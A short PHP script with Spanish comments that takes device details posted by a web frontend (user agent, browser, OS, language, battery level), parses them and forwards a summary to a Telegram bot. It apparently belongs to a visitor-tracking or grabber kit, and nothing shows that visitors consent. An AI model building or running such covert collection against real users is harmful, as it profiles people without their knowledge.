<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/telegram.php';

// Recibir datos del frontend
$user_agent = $_POST['agent'] ?? 'Desconocido';
$navigator  = $_POST['navegador'] ?? 'N/A';
$versionapp = $_POST['versionapp'] ?? 'N/A';
$dystro     = $_POST['dystro'] ?? 'N/A';
$lenguaje   = $_POST['idioma'] ?? 'N/A';
$bateri     = $_POST['bateri'] ?? 'N/A';

// Extraer Mobile
preg_match('/\)([^)]*);([^;]*)$/', $user_agent, $mobileMatch);
$mobile = $mobileMatch[1] ?? 'N/A';

// Extraer Version
preg_match('/;([^;]*)$/', $user_agent, $versionMatch);
$version = $versionMatch[1] ?? $versionapp;

// Extraer Navegador
preg_match('/\)([^)]*)$/', $user_agent, $navMatch);
$navegador = $navMatch[1] ?? $navigator;

// Sistema operativo y arquitectura
$operativo = $dystro;
if (stripos($dystro, 'armv7l') !== false) {
    $arquitectura = 'arm 32bits';
} elseif (stripos($dystro, 'armv8l') !== false) {
    $arquitectura = 'arm 64bits';
} else {
    $arquitectura = 'N/A';
}

// Ajustar lenguaje y país
if ($lenguaje === "es-MX") {
    $lang_text = "Español/Mexicano";
    $pais = "Mexico";
} else {
    $lang_text = $lenguaje;
    $pais = "Desconocido";
}

// Formatear mensaje para Telegram
$msg = "📊 <b>Nueva info recibida</b>\n".
       "📱 Mobile: $mobile\n".
       "🌐 Navegador: $navegador\n".
       "📦 Versión App: $version\n".
       "💻 Sistema Operativo: $operativo\n".
       "⚙ Arquitectura: $arquitectura\n".
       "🗣 Idioma: $lang_text\n".
       "🌎 País: $pais\n".
       "🔋 Batería: $bateri%";

// Enviar a Telegram
send_to_telegram($msg);

// Respuesta JSON
echo json_encode(['status' => 'ok']);
?>

